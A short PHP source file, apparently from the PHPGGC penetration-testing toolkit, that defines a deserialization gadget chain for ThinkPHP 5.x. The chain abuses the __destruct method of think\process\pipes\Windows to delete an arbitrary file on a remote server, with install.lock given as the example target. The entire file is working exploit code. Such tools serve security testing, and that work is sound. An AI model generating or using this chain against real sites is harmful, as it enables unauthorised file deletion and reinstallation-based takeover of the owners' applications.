<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */

namespace GadgetChain\ThinkPHP;


class FD1 extends \PHPGGC\GadgetChain\FileDelete
{
    public $version = '5.x';
    public $vector = '__destruct';
    public $author = 'wh1t3p1g';
    public $informations = '
    	This chain is supposed to delete arbitrary remote file, like install.lock
    ';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_file'];
        return new \think\process\pipes\Windows($path);
    }
}